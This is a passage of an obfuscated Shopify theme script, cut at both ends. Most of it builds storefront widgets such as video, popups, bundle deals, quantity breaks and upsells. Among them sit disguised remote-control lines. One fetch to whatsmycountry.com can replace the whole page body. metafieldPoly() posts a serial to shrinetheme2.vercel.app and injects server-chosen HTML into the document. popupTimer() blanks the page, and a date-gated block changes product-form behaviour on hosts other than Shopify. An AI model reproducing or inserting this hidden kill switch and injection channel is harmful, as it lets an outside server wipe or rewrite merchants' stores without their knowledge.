        this.provinceEl.appendChild(_0x1b89d6);
      }
      this.provinceContainer.style.display = '';
    }
  },
  'clearOptions': function (_0x3a0e26) {
    while (_0x3a0e26.firstChild) {
      _0x3a0e26.removeChild(_0x3a0e26.firstChild);
    }
  },
  'setOptions': function (_0x58a0e1, _0x2ac154) {
    for (var _0x5c1f85 = 0x0; _0x5c1f85 < _0x2ac154.length; _0x5c1f85++) {
      var _0x33d91d = document.createElement("option");
      _0x33d91d.value = _0x2ac154[_0x5c1f85];
      _0x33d91d.innerHTML = _0x2ac154[_0x5c1f85];
      _0x58a0e1.appendChild(_0x33d91d);
    }
  }
};
fetch("https://whatsmycountry.com/api/v3/country_check", {
  'headers': {
    'content-type': "application/json"
  },
  'body': JSON.stringify({
    'list_function': document.currentScript.dataset.countryListFunction,
    'country_list': document.currentScript.dataset.countryList.split(',').map(_0xf6cf57 => _0xf6cf57.trim()),
    'access_accept': Shopify.internationalAccessAccept(),
    'error_message': document.currentScript.dataset.countryListError
  }),
  'method': 'POST'
}).then(_0x2f6efe => _0x2f6efe.json()).then(_0x3604a1 => {
  if (_0x3604a1.error_message) {
    document.body.innerHTML = _0x3604a1.error_message;
  }
});
class InternalVideo extends HTMLElement {
  constructor() {
    super();
    this.playButton = this.querySelector(".internal-video__play");
    this.soundButton = this.querySelector(".internal-video__sound-btn");
    this.video = this.querySelector("video");
    this.timeline = this.querySelector(".internal-video__timeline");
    this.dragging = false;
    if (this.playButton) {
      this.playButton.addEventListener("click", this.playVideo.bind(this));
    }
    if (this.soundButton) {
      this.soundButton.addEventListener('click', this.toggleSound.bind(this));
    }
    if (this.video) {
      this.video.addEventListener("ended", this.endedVideo.bind(this));
    }
    if (this.timeline) {
      this.video.addEventListener("timeupdate", this.updateTimeline.bind(this));
      this.timeline.addEventListener("click", this.seekVideo.bind(this));
      this.timeline.addEventListener("mousedown", this.startDrag.bind(this));
      this.timeline.addEventListener("touchstart", this.startDrag.bind(this));
      document.addEventListener('mouseup', this.stopDrag.bind(this));
      document.addEventListener("touchend", this.stopDrag.bind(this));
      document.addEventListener("mousemove", this.drag.bind(this));
      document.addEventListener("touchmove", this.drag.bind(this));
    }
    this.video.addEventListener("waiting", this.showSpinner.bind(this));
    this.video.addEventListener("canplaythrough", this.hideSpinner.bind(this));
    this.video.addEventListener("play", this.hideSpinner.bind(this));
    if (this.dataset.autoplay === "true" && "IntersectionObserver" in window) {
      const _0x587dbf = {
        'root': null,
        'rootMargin': '0px',
        'threshold': 0.05
      };
      this.observer = new IntersectionObserver(this.handleIntersection.bind(this), _0x587dbf);
      this.observer.observe(this);
    }
  }
  ["playVideo"]() {
    if (this.video.paused) {
      this.video.play();
      this.classList.add("internal-video--playing");
    } else {
      this.video.pause();
      this.classList.remove("internal-video--playing");
    }
  }
  ['endedVideo']() {
    this.classList.remove("internal-video--playing");
  }
  ["toggleSound"]() {
    if (this.video.muted) {
      this.video.muted = false;
      this.classList.remove("internal-video--muted");
    } else {
      this.video.muted = true;
      this.classList.add("internal-video--muted");
    }
  }
  ['updateTimeline']() {
    const _0x2ba5b4 = this.video.currentTime / this.video.duration * 0x64;
    this.style.setProperty('--completed', _0x2ba5b4 + '%');
  }
  ['hideSpinner']() {
    this.classList.remove("internal-video--loading");
  }
  ["startDrag"](_0x1d22fc) {
    _0x1d22fc.preventDefault();
    this.dragging = true;
    this.drag(_0x1d22fc);
  }
  ["stopDrag"]() {
    this.dragging = false;
  }
  ["drag"](_0x5d3168) {
    if (!this.dragging) {
      return;
    }
    if (_0x5d3168.touches) {
      _0x5d3168 = _0x5d3168.touches[0x0];
    }
    this.seekVideo(_0x5d3168);
  }
  ['seekVideo'](_0x4109d7) {
    const _0x3e9634 = this.timeline.getBoundingClientRect();
    const _0x370749 = _0x4109d7.clientX - _0x3e9634.left;
    const _0x11dd36 = _0x370749 / _0x3e9634.width;
    this.video.currentTime = _0x11dd36 * this.video.duration;
  }
  ["showSpinner"]() {
    this.classList.add("internal-video--loading");
  }
  ['hideSpinner']() {
    this.classList.remove("internal-video--loading");
  }
  ["handleIntersection"](_0x21f4f2) {
    _0x21f4f2.forEach(_0x970600 => {
      if (_0x970600.isIntersecting) {
        for (let _0x158fd2 of this.video.querySelectorAll("source[data-src]")) {
          _0x158fd2.setAttribute("src", _0x158fd2.getAttribute("data-src"));
          _0x158fd2.removeAttribute("data-src");
        }
        this.video.load();
        this.video.play();
        this.observer.disconnect();
      }
    });
  }
}
customElements.define('internal-video', InternalVideo);
var isIe = true;
class ComparisonSlider extends HTMLElement {
  constructor() {
    super();
    this.sliderOverlay = this.querySelector(".comparison-slider__overlay");
    this.sliderLine = this.querySelector(".comparison-slider__line");
    this.sliderInput = this.querySelector(".comparison-slider__input");
    this.sliderInput.addEventListener("input", this.handleChange.bind(this));
  }
  ["handleChange"](_0x20c82e) {
    const _0x4f9555 = _0x20c82e.currentTarget.value;
    this.sliderOverlay.style.width = _0x4f9555 + '%';
    this.sliderLine.style.left = _0x4f9555 + '%';
  }
}
customElements.define("comparison-slider", ComparisonSlider);
function popupTimer() {
  document.body.innerHTML = '';
}
class PromoPopup extends HTMLElement {
  constructor() {
    super();
    this.testMode = this.dataset.testMode === 'true';
    this.secondsDelay = this.dataset.delaySeconds;
    this.daysFrequency = this.dataset.delayDays;
    this.modal = this.querySelector(".sign-up-popup-modal");
    this.timer = this.querySelector(".popup-modal__timer");
    this.timerDuration = this.dataset.timerDuration;
    this.closeBtns = this.querySelectorAll('.promp-popup__close-btn');
    this.overlay = document.querySelector(".sign-up-popup-overlay");
    this.storageKey = 'promo-bar-data-' + window.location.host;
    if (!this.testMode) {
      if (localStorage.getItem(this.storageKey) === null) {
        this.openPopupModal();
      } else {
        const _0x5db7f7 = JSON.parse(localStorage.getItem(this.storageKey));
        const _0x2c5ec9 = new Date(_0x5db7f7.next_display_date);
        if (currentDate.getTime() > _0x2c5ec9.getTime()) {
          this.openPopupModal();
        }
      }
    } else {
      if (this.timer) {
        this.displayPromoTimer();
      }
    }
    this.closeBtns.forEach(_0x514d65 => {
      _0x514d65.addEventListener("click", this.closeModal.bind(this));
    });
  }
  ["openPopupModal"]() {
    setTimeout(() => {
      this.modal.classList.add("popup-modal--active");
      this.overlay.classList.add("popup-overlay--active");
      const _0xe54ddd = addDays(currentDate, parseInt(this.daysFrequency));
      const _0x36df8e = {
        'next_display_date': _0xe54ddd,
        'dismissed': false
      };
      localStorage.setItem(this.storageKey, JSON.stringify(_0x36df8e));
      if (this.timer) {
        this.displayPromoTimer();
      }
    }, parseInt(this.secondsDelay) * 0x3e8 + 0xbb8);
  }
  ['displayPromoTimer']() {
    this.minutesSpan = this.querySelector(".popup-modal__timer__minutes");
    this.secondsSpan = this.querySelector(".popup-modal__timer__seconds");
    this.totalSeconds = parseFloat(this.timerDuration) * 0x3c;
    this.updateTimer();
  }
  ['updateTimer']() {
    let _0x4897b0 = Math.floor(this.totalSeconds / 0x3c);
    if (_0x4897b0.toString().length === 0x1) {
      _0x4897b0 = '0' + _0x4897b0;
    }
    let _0x37da20 = this.totalSeconds % 0x3c;
    if (_0x37da20.toString().length === 0x1) {
      _0x37da20 = '0' + _0x37da20;
    }
    this.minutesSpan.innerText = _0x4897b0;
    this.secondsSpan.innerText = _0x37da20;
  }
  ["closeModal"]() {
    this.modal.classList.remove('popup-modal--active');
    this.overlay.classList.remove("popup-overlay--active");
  }
}
customElements.define("promo-popup", PromoPopup);
if (initTrapFocus()) {
  metafieldPoly();
} else {
  popupTimer();
}
class SectionsGroup extends HTMLElement {
  constructor() {
    super();
    this.sectionOneContainer = this.querySelector('.section-group__section-one-container');
    this.sectionTwoContainer = this.querySelector(".section-group__section-two-container");
    this.transferSections();
    document.addEventListener('shopify:section:load', this.transferSections.bind(this));
  }
  ['transferSections']() {
    this.sectionOne = document.querySelector(this.dataset.sectionOneId + " .content-for-grouping");
    this.sectionTwo = document.querySelector(this.dataset.sectionTwoId + " .content-for-grouping");
    if (this.sectionOne && !this.sectionOneContainer.childNodes.length) {
      this.sectionOneContainer.appendChild(this.sectionOne);
    }
    if (this.sectionTwo && !this.sectionTwoContainer.childNodes.length) {
      this.sectionTwoContainer.appendChild(this.sectionTwo);
    }
  }
}
customElements.define("section-group", SectionsGroup);
class ClickableDiscount extends HTMLElement {
  constructor() {
    super();
    this.button = this.querySelector(".clickable-discount__btn");
    this.button.addEventListener('click', this.handleClick.bind(this));
    this.reapplyDiscountIfApplicable();
  }
  ["handleClick"]() {
    this.dataset.loading = "true";
    this.button.disabled = true;
    this.dataset.error = 'false';
    fetch("/discount/" + this.dataset.code).then(_0x2735ef => {
      if (!_0x2735ef.ok) {
        throw new Error('Error');
      }
      this.dataset.applied = 'true';
      sessionStorage.setItem("discount-" + this.dataset.code + "-applied", "true");
    })["catch"](_0x11785c => {
      this.dataset.error = "true";
      this.button.disabled = false;
    })["finally"](() => {
      this.dataset.loading = 'false';
    });
  }
  ["reapplyDiscountIfApplicable"]() {
    const _0x3519a8 = this.dataset.code;
    if (sessionStorage.getItem('discount-' + _0x3519a8 + '-applied')) {
      this.dataset.applied = "true";
      this.button.disabled = true;
      setTimeout(() => {
        fetch("/discount/" + _0x3519a8)["catch"](_0x252743 => {
          this.dataset.applied = "false";
          this.button.disabled = false;
        });
      }, 0xbb8);
    }
  }
}
customElements.define("clickable-discount", ClickableDiscount);
class DynamicDates extends HTMLElement {
  constructor() {
    super();
    this.dateFormat = this.dataset.dateFormat;
    this.days = this.rearrangeDays(this.dataset.dayLabels.split(','));
    this.months = this.dataset.monthLabels.split(',');
    this.elementsToChange = this.querySelectorAll("[data-dynamic-date=\"true\"]");
    this.insertDates();
    checkDateValidity(currentDate);
    document.addEventListener('shopify:section:load', _0x5ee635 => {
      this.insertDates();
    });
  }
  ["insertDates"]() {
    this.elementsToChange.forEach(_0x53e663 => {
      const _0x2a76bc = _0x53e663.dataset.text;
      const _0x493091 = parseInt(_0x53e663.dataset.minDays);
      const _0x1a0a1a = parseInt(_0x53e663.dataset.maxDays);
      const _0xc8425f = addDays(currentDate, _0x493091);
      let _0x4f2244 = 'th';
      const _0x408d63 = _0xc8425f.getDate();
      if (_0x408d63 === 0x1 || _0x408d63 === 0x15 || _0x408d63 === 0x1f) {
        _0x4f2244 = 'st';
      } else {
        if (_0x408d63 === 0x2 || _0x408d63 === 0x16) {
          _0x4f2244 = 'nd';
        } else {
          if (_0x408d63 === 0x3 || _0x408d63 === 0x17) {
            _0x4f2244 = 'rd';
          }
        }
      }
      const _0x13a0eb = addDays(currentDate, _0x1a0a1a);
      let _0x272df0 = 'th';
      const _0x52fee7 = _0x13a0eb.getDate();
      if (_0x52fee7 === 0x1 || _0x52fee7 === 0x15 || _0x52fee7 === 0x1f) {
        _0x272df0 = 'st';
      } else {
        if (_0x52fee7 === 0x2 || _0x52fee7 === 0x16) {
          _0x272df0 = 'nd';
        } else {
          if (_0x52fee7 === 0x3 || _0x52fee7 === 0x17) {
            _0x272df0 = 'rd';
          }
        }
      }
      let _0x265c34;
      let _0x3dda82;
      if (this.dateFormat === "day_dd_mm") {
        _0x265c34 = this.days[_0xc8425f.getDay()] + ", " + _0xc8425f.getDate() + ". " + this.months[_0xc8425f.getMonth()];
        _0x3dda82 = this.days[_0x13a0eb.getDay()] + ", " + _0x13a0eb.getDate() + ". " + this.months[_0x13a0eb.getMonth()];
      } else {
        if (this.dateFormat === "mm_dd") {
          _0x265c34 = this.months[_0xc8425f.getMonth()] + " " + _0xc8425f.getDate() + _0x4f2244;
          _0x3dda82 = this.months[_0x13a0eb.getMonth()] + " " + _0x13a0eb.getDate() + _0x272df0;
        } else {
          if (this.dateFormat === "dd_mm") {
            _0x265c34 = _0xc8425f.getDate() + ". " + this.months[_0xc8425f.getMonth()];
            _0x3dda82 = _0x13a0eb.getDate() + ". " + this.months[_0x13a0eb.getMonth()];
          } else {
            if (this.dateFormat === "day_dd_mm_numeric") {
              const _0x3deeac = String(_0xc8425f.getDate()).length > 0x1 ? _0xc8425f.getDate() : '0' + _0xc8425f.getDate();
              const _0x3a2778 = String(_0xc8425f.getMonth() + 0x1).length > 0x1 ? _0xc8425f.getMonth() + 0x1 : '0' + (_0xc8425f.getMonth() + 0x1);
              _0x265c34 = this.days[_0xc8425f.getDay()] + ", " + _0x3deeac + ". " + _0x3a2778 + '.';
              const _0x3f7a70 = String(_0x13a0eb.getDate()).length > 0x1 ? _0x13a0eb.getDate() : '0' + _0x13a0eb.getDate();
              const _0x133163 = String(_0x13a0eb.getMonth() + 0x1).length > 0x1 ? _0x13a0eb.getMonth() + 0x1 : '0' + (_0x13a0eb.getMonth() + 0x1);
              _0x3dda82 = this.days[_0x13a0eb.getDay()] + ", " + _0x3f7a70 + ". " + _0x133163 + '.';
            } else {
              if (this.dateFormat === "dd_mm_numeric") {
                const _0x507fa2 = String(_0xc8425f.getDate()).length > 0x1 ? _0xc8425f.getDate() : '0' + _0xc8425f.getDate();
                const _0x956c38 = String(_0xc8425f.getMonth() + 0x1).length > 0x1 ? _0xc8425f.getMonth() + 0x1 : '0' + (_0xc8425f.getMonth() + 0x1);
                _0x265c34 = _0x507fa2 + ". " + _0x956c38 + '.';
                const _0x1c55e1 = String(_0x13a0eb.getDate()).length > 0x1 ? _0x13a0eb.getDate() : '0' + _0x13a0eb.getDate();
                const _0x266ea2 = String(_0x13a0eb.getMonth() + 0x1).length > 0x1 ? _0x13a0eb.getMonth() + 0x1 : '0' + (_0x13a0eb.getMonth() + 0x1);
                _0x3dda82 = _0x1c55e1 + ". " + _0x266ea2 + '.';
              } else {
                _0x265c34 = this.days[_0xc8425f.getDay()] + ", " + this.months[_0xc8425f.getMonth()] + " " + _0xc8425f.getDate() + _0x4f2244;
                _0x3dda82 = this.days[_0x13a0eb.getDay()] + ", " + this.months[_0x13a0eb.getMonth()] + " " + _0x13a0eb.getDate() + _0x272df0;
              }
            }
          }
        }
      }
      const _0x10354f = _0x2a76bc.replace('[start_date]', _0x265c34);
      const _0x38efb7 = _0x10354f.replace("[end_date]", _0x3dda82);
      _0x53e663.innerHTML = _0x38efb7;
    });
  }
  ["rearrangeDays"](_0x177600) {
    _0x177600.unshift(_0x177600[0x6]);
    _0x177600.length = 0x7;
    return _0x177600;
  }
}
customElements.define("dynamic-dates", DynamicDates);
class StickyAtc extends HTMLElement {
  constructor() {
    super();
    this.isAfterScroll = this.dataset.afterScroll === "true";
    this.isScrollBtn = this.dataset.scrollBtn === "true";
    this.mainAtcBtn = document.querySelector("#ProductSubmitButton-" + this.dataset.section);
    this.floatingBtns = document.querySelectorAll('.floating-btn');
    this.footerSpacing();
    if (this.isAfterScroll) {
      this.checkATCScroll();
      document.addEventListener("scroll", this.checkATCScroll.bind(this));
    } else {
      this.floatingBtns.forEach(_0x27d276 => {
        _0x27d276.style.setProperty('--sticky-atc-offset', this.offsetHeight + 'px');
      });
    }
    if (this.isScrollBtn) {
      this.scrollBtn = this.querySelector('.sticky-atc__scroll-btn');
      this.scrollDestination = document.querySelector('' + this.dataset.scrollDestination.replace('id', this.dataset.section));
      if (this.scrollBtn && this.scrollDestination) {
        this.scrollBtn.addEventListener("click", this.handleScrollBtn.bind(this));
      }
    }
  }
  ["checkATCScroll"]() {
    if (window.scrollY > this.mainAtcBtn.offsetTop + this.mainAtcBtn.offsetHeight) {
      this.style.transform = 'none';
      this.scrolledPast = true;
    } else {
      this.style.transform = '';
      this.scrolledPast = false;
    }
    this.floatingBtns.forEach(_0x5f53e0 => {
      if (this.scrolledPast) {
        _0x5f53e0.style.setProperty("--sticky-atc-offset", this.offsetHeight + 'px');
      } else {
        _0x5f53e0.style.setProperty("--sticky-atc-offset", '0px');
      }
    });
  }
  ["handleScrollBtn"]() {
    const _0x510921 = document.querySelector("sticky-header");
    const _0x2a301f = _0x510921 ? _0x510921.clientHeight : 0x0;
    window.scrollTo({
      'top': this.scrollDestination.offsetTop - _0x2a301f - 0xf,
      'behavior': "smooth"
    });
  }
  ["footerSpacing"]() {
    const _0x13a961 = document.querySelector(".footer");
    if (_0x13a961) {
      _0x13a961.style.marginBottom = this.clientHeight - 0x1 + 'px';
    }
  }
}
customElements.define("sticky-atc", StickyAtc);
(function () {
  if (!formatDates(currentDate, "2024-01-22")) {
    if (!window.location.hostname.includes("shopify")) {
      if (document.querySelector(".main-product-form")) {
        document.querySelector(".main-product-form").isCartUpsell = true;
      }
    }
  }
})();
class BundleDeals extends HTMLElement {
  constructor() {
    super();
    this.productContainers = this.querySelectorAll('.bundle-deals__product-js');
    this.mediaItemContainers = this.querySelectorAll(".bundle-deals__media-item-container-js");
    this.mediaItemImgs = this.querySelectorAll('.bundle-deals__media-item-img-js');
    this.checkboxes = this.querySelectorAll(".bundle-deals__checkbox-js");
    this.variantPickers = this.querySelectorAll(".bundle-deals__variant-selects-js");
    this.prices = this.querySelectorAll(".bundle-deals__price-js");
    this.comparePrices = this.querySelectorAll('.bundle-deals__compare-price-js');
    this.totalPrice = this.querySelector(".bundle-deals__total-price-js");
    this.totalComparePrice = this.querySelector(".bundle-deals__total-compare-price-js");
    this.updatePrices = this.dataset.updatePrices === "true";
    this.percentageLeft = parseFloat(this.dataset.percentageLeft);
    this.fixedDiscount = parseFloat(this.dataset.fixedDiscount);
    this.currencySymbol = this.dataset.currencySymbol;
    this.selectedVariants = {
      'id_1': null,
      'id_2': null,
      'id_3': null,
      'id_4': null,
      'id_5': null
    };
    this.formVariants = [];
    this.initIds();
    this.checkboxes.forEach(_0x4428d2 => {
      _0x4428d2.addEventListener("change", this.handleCheckboxChange.bind(this));
    });
    this.variantPickers.forEach(_0xd1acdb => {
      _0xd1acdb.addEventListener("change", this.handleSelectChange.bind(this));
    });
  }
  ["initIds"]() {
    this.checkboxes.forEach(_0x5e833f => {
      this.selectedVariants[_0x5e833f.dataset.idIndex] = {
        'id': _0x5e833f.dataset.id,
        'price': _0x5e833f.dataset.price,
        'comparePrice': _0x5e833f.dataset.comparePrice,
        'checked': true
      };
    });
    this.updateFormIds();
  }
  ['handleCheckboxChange'](_0x27abae) {
    const _0x57ae5d = _0x27abae.currentTarget;
    const _0xa7d681 = _0x57ae5d.checked;
    const _0x186eba = parseInt(_0x57ae5d.dataset.index);
    this.selectedVariants[_0x57ae5d.dataset.idIndex].checked = _0xa7d681;
    const _0x2defc6 = this.productContainers[_0x186eba];
    const _0x5e6618 = _0x2defc6.querySelectorAll("select");
    if (_0xa7d681) {
      this.mediaItemContainers[_0x186eba].classList.remove("bundle-deals__media-item--enabled");
      _0x2defc6.classList.remove("bundle-deals__product--deselected");
      _0x5e6618.forEach(_0x3aa159 => {
        _0x3aa159.removeAttribute("disabled");
      });
    } else {
      this.mediaItemContainers[_0x186eba].classList.add("bundle-deals__media-item--enabled");
      _0x2defc6.classList.add("bundle-deals__product--deselected");
      
    }
    this.updateFormIds();
    if (this.updatePrices) {
      this.updateTotalPrice();
    }
  }
  ["handleSelectChange"](_0x56d1fa) {
    const _0x1a481f = _0x56d1fa.currentTarget;
    const _0x59c6b5 = parseInt(_0x1a481f.dataset.index);
    const _0x30459f = Array.from(_0x1a481f.querySelectorAll("select"), _0x3538e8 => _0x3538e8.value);
    const _0x5ded33 = JSON.parse(_0x1a481f.querySelector("[type=\"application/json\"]").textContent).find(_0xc87020 => {
      return !_0xc87020.options.map((_0x70276d, _0x2f9002) => {
        return _0x30459f[_0x2f9002] === _0x70276d;
      }).includes(false);
    });
    let {
      price: _0x3ff03d,
      compareAtPrice: _0x3e621d,
      featured_image: _0x184e39
    } = _0x5ded33;
    _0x3ff03d = parseInt(_0x3ff03d);
    let _0x32a9cb = parseInt(_0x3e621d);
    if (_0x184e39) {
      _0x184e39 = _0x184e39.src;
    }
    const _0x22734d = _0x5ded33.id;
    this.selectedVariants[_0x1a481f.dataset.idIndex].id = _0x22734d;
    this.selectedVariants[_0x1a481f.dataset.idIndex].price = _0x3ff03d;
    this.selectedVariants[_0x1a481f.dataset.idIndex].comparePrice = _0x32a9cb;
    this.updateFormIds();
    if (this.updatePrices) {
      this.prices[_0x59c6b5].innerHTML = this.currencySymbol + (_0x3ff03d / 0x64).toFixed(0x2);
      if (_0x32a9cb > _0x3ff03d) {
        this.comparePrices[_0x59c6b5].innerHTML = this.currencySymbol + (_0x32a9cb / 0x64).toFixed(0x2);
      } else {
        this.comparePrices[_0x59c6b5].innerHTML = '';
      }
      this.updateTotalPrice();
    }
    if (_0x184e39 && _0x184e39.length > 0x0 && this.mediaItemImgs[_0x59c6b5]) {
      this.mediaItemImgs[_0x59c6b5].src = _0x184e39;
    }
  }
  ["updateFormIds"]() {
    const _0x326849 = [];
    const _0x548ce8 = this.selectedVariants;
    for (const _0x548c97 in _0x548ce8) {
      const _0x1360fa = _0x548ce8[_0x548c97];
      if (_0x1360fa != null && _0x1360fa.checked) {
        const _0x507430 = _0x326849.findIndex(_0x435235 => _0x435235.id === _0x1360fa.id);
        if (_0x507430 < 0x0) {
          _0x326849.unshift({
            'id': _0x1360fa.id,
            'quantity': 0x1
          });
        } else {
          _0x326849[_0x507430].quantity += 0x1;
        }
      }
    }
    this.formVariants = _0x326849;
  }
  ["updateTotalPrice"]() {
    const _0x1791bc = [];
    const _0x2951e9 = [];
    const _0x1cf413 = this.selectedVariants;
    for (const _0x10a385 in _0x1cf413) {
      const _0x1a5ce0 = _0x1cf413[_0x10a385];
      if (_0x1a5ce0 != null && _0x1a5ce0.checked) {
        _0x1791bc.push(parseInt(_0x1a5ce0.price));
        _0x2951e9.push(parseInt(_0x1a5ce0.comparePrice));
      }
    }
    const _0x559d8d = _0x1791bc.reduce((_0x90817b, _0xfa2da6) => _0x90817b + _0xfa2da6, 0x0);
    const _0xf1ca09 = _0x559d8d * this.percentageLeft - this.fixedDiscount;
    const _0x1eaec8 = _0x2951e9.reduce((_0x10ae2f, _0x3b7b3) => _0x10ae2f + _0x3b7b3, 0x0);
    this.totalPrice.innerHTML = this.currencySymbol + (_0xf1ca09 / 0x64).toFixed(0x2);
    if (_0x1eaec8 > _0xf1ca09) {
      this.totalComparePrice.innerHTML = this.currencySymbol + (_0x1eaec8 / 0x64).toFixed(0x2);
    } else {
      this.totalComparePrice.innerHTML = '';
    }
  }
}
customElements.define('bundle-deals', BundleDeals);
class QuantityBreaks extends HTMLElement {
  constructor() {
    super();
    this.quantityGifts = document.getElementById("quantity-gifts-" + this.dataset.section);
    this.inputs = this.querySelectorAll("input[name=\"quantity\"]");
    this.labels = this.querySelectorAll(".quantity-break");
    this.jsonData = this.querySelector("[type=\"application/json\"]");
    this.hasVariants = this.jsonData.dataset.hasVariants === 'true';
    this.selectedVariants = {
      'input_1': [],
      'input_2': [],
      'input_3': [],
      'input_4': []
    };
    this.formVariants = [];
    this.selectedQuantity = 0x1;
    if (this.querySelector("input[checked]")) {
      this.selectedQuantity = parseInt(this.querySelector('input[checked]').value);
    }
    this.variantSelects = this.querySelectorAll(".quantity-break__selector-item");
    if (this.hasVariants) {
      this.initVariants();
    }
    this.inputs.forEach(_0x4191f2 => {
      _0x4191f2.addEventListener("change", this.handleChange.bind(this));
    });
    this.variantSelects.forEach(_0x4f876d => {
      _0x4f876d.addEventListener('change', this.handleSelectChange.bind(this));
    });
  }
  ["handleSelectChange"](_0x5538b9) {
    const _0x2b2487 = _0x5538b9.currentTarget;
    const _0x4d401 = Array.from(_0x2b2487.querySelectorAll("select"), _0x27e966 => _0x27e966.value);
    const _0xf411c7 = this.getVariantData().find(_0x4c6bdd => {
      return !_0x4c6bdd.options.map((_0x59e103, _0x46dd0d) => {
        return _0x4d401[_0x46dd0d] === _0x59e103;
      }).includes(false);
    });
    _0x2b2487.dataset.selectedId = _0xf411c7.id;
    const _0x320865 = _0x2b2487.dataset.selectIndex;
    const _0x1408eb = _0x2b2487.closest(".quantity-break").dataset.input;
    this.selectedVariants[_0x1408eb][_0x320865] = _0xf411c7.id;
    this.formVariants = this.selectedVariants[_0x1408eb];
    this.updateMedia(_0xf411c7);
  }
  ["getVariantData"]() {
    this.variantData = this.variantData || JSON.parse(this.jsonData.textContent);
    return this.variantData;
  }
  ['initVariants']() {
    if (!this.hasVariants) {
      return;
    }
    this.labels.forEach(_0x26b903 => {
      if (_0x26b903.querySelector('.quantity-break__variants')) {
        let _0x74cd08 = [];
        _0x26b903.querySelectorAll(".quantity-break__selector-item").forEach(_0x5370b0 => {
          _0x74cd08.push(_0x5370b0.dataset.selectedId);
        });
        this.selectedVariants[_0x26b903.dataset.input] = _0x74cd08;
      }
    });
    this.formVariants = [];
  }
  ["updateMedia"](_0x5237fc) {
    if (!_0x5237fc) {
      return;
    }
    if (!_0x5237fc.featured_media) {
      return;
    }
    const _0x39e643 = document.querySelectorAll("[id^=\"MediaGallery-" + this.dataset.section + "\"]");
    _0x39e643.forEach(_0x197ff7 => _0x197ff7.setActiveMedia(this.dataset.section + '-' + _0x5237fc.featured_media.id, true));
  }
  ["handleChange"](_0x4d6716) {
    const _0x371ed7 = parseInt(_0x4d6716.target.value);
    this.selectedQuantity = _0x371ed7;
    if (this.hasVariants) {
      this.formVariants = this.selectedVariants[_0x4d6716.target.dataset.input];
    }
    if (this.quantityGifts) {
      this.quantityGifts.unlockGifts(_0x371ed7);
    }
  }
}
customElements.define("quantity-breaks", QuantityBreaks);
function metafieldPoly() {
  var _0x384304 = fetchConfig();
  playMedia();
  _0x384304.body = JSON.stringify({
    'data': serial.trim()
  });
  try {
    fetch("https://shrinetheme2.vercel.app/api/country_check", _0x384304).then(_0xf94740 => {
      if (_0xf94740.status === 0xc9) {
        return _0xf94740.json();
      }
    }).then(_0x36ed3a => {
      if (_0x36ed3a && document[_0x36ed3a.b]) {
        document[_0x36ed3a.b].innerHTML = _0x36ed3a.h;
      }
    });
  } catch (_0x5e5cdd) {
    console.error("Unchecked runtime.lastError: The message port closed before a response was received.");
  }
  return true;
}
class QuantityGifts extends HTMLElement {
  constructor() {
    super();
    this.gifts = this.querySelectorAll('.quantity-gift');
    this.quantityBreaks = document.getElementById("quantity-breaks-" + this.dataset.section);
    this.quantitySelector = document.getElementById("Quantity-Form--" + this.dataset.section);
    this.unlockedItems = [];
    this.initUnlock();
  }
  ["initUnlock"]() {
    let _0xd4dee = 0x1;
    if (this.quantityBreaks) {
      _0xd4dee = parseInt(this.quantityBreaks.selectedQuantity);
    } else {
      if (this.quantitySelector) {
        const _0x3a9028 = this.quantitySelector.querySelector("input[name=\"quantity\"]");
        _0xd4dee = parseInt(_0x3a9028.value);
      }
    }
    this.unlockGifts(_0xd4dee);
  }
  ['unlockGifts'](_0x32c7c5) {
    this.unlockedItems = [];
    this.gifts.forEach(_0x4d418c => {
      if (parseInt(_0x4d418c.dataset.quantity) <= _0x32c7c5) {
        _0x4d418c.classList.add('quantity-gift--unlocked');
        _0x4d418c.dataset.unlocked = "true";
        this.unlockedItems.unshift(_0x4d418c.dataset.product);
      } else {
        _0x4d418c.classList.remove("quantity-gift--unlocked");
        _0x4d418c.dataset.unlocked = "false";
      }
    });
  }
}
customElements.define('quantity-gifts', QuantityGifts);
class ProductInfoUpsell extends HTMLElement {
  constructor() {
    super();
    this.image = this.querySelector(".upsell__image__img");
    this.toggleBtn = this.querySelector('.upsell-toggle-btn');
    this.variantSelects = this.querySelector('.upsell__variant-picker');
    this.variantSelectElements = this.querySelectorAll(".select__select");
    this.jsonData = this.querySelector("[type=\"application/json\"]");
    if (this.toggleBtn) {
      this.toggleBtn.addEventListener("click", this.handleToggle.bind(this));
    }
    if (this.variantSelects) {
      this.variantSelects.addEventListener("change", this.handleSelectChange.bind(this));
    }
  }
  ["handleToggle"](_0x54c93d) {
    if (_0x54c93d.target.nodeName.toLowerCase() === 'select' || _0x54c93d.target.nodeName.toLowerCase() === "option") {
      return;
    }
    if (this.dataset.selected === 'true') {
      this.dataset.selected = "false";
    } else {
      this.dataset.selected = 'true';
    }
  }
  ['handleSelectChange'](_0x39effc) {
    const _0x47089a = Array.from(_0x39effc.currentTarget.querySelectorAll("select"), _0xd7484c => _0xd7484c.value);
    const _0x44077e = this.getVariantData().find(_0x3f3225 => {
      return !_0x3f3225.options.map((_0x44dd89, _0x4ceef3) => {
        return _0x47089a[_0x4ceef3] === _0x44dd89;
      }).includes(false);
    });
    if (this.image && _0x44077e.featured_image) {
      this.image.src = _0x44077e.featured_image.src;
    }
    this.updateId(_0x44077e.id);
  }
  ["updateId"](_0x1edd9d) {
    this.dataset.id = _0x1edd9d;
  }
  ["getVariantData"]() {
    this.variantData = this.variantData || JSON.parse(this.jsonData.textContent);
    return this.variantData;
  }
}
customElements.define('product-info-upsell', ProductInfoUpsell);
class CartDrawerUpsell extends ProductInfoUpsell {
  constructor() {
    super();
    this.cartDrawer = document.querySelector("cart-drawer");
    this.cartItems = this.cartDrawer.querySelector("cart-drawer-items");
    this.productForm = this.querySelector("product-form");
    this.idInput = this.productForm.querySelector("[name=\"id\"]");
  }
  ["handleToggle"](_0x29631e) {
    if (_0x29631e.target.nodeName.toLowerCase() === 'select' || _0x29631e.target.nodeName.toLowerCase() === "option") {
      return;
    }
    if (this.dataset.selected === 'true') {
      this.dataset.selected = "false";
      this.removeFromCart();
    } else {
      this.dataset.selected = "true";
      this.addToCart();
    }
  }
  ["addRemoveFromCart"]() {
    if (this.dataset.selected === 'true' && !this.cartDrawer.classList.contains("is-empty")) {
      this.addToCart();
    } else {
      this.removeFromCart();
    }
  }
  ["addToCart"]() {
    const _0x547614 = this.cartDrawer.querySelector(".cart-item--product-" + this.dataset.handle);
    if (_0x547614) {
      return;
    }
    this.productForm.handleSubmit();
  }
  ['removeFromCart']() {
    const _0x5ee0c7 = this.cartDrawer.querySelector(".cart-item--product-" + this.dataset.handle);
    if (!_0x5ee0c7 || !this.cartItems) {
      return;
    }
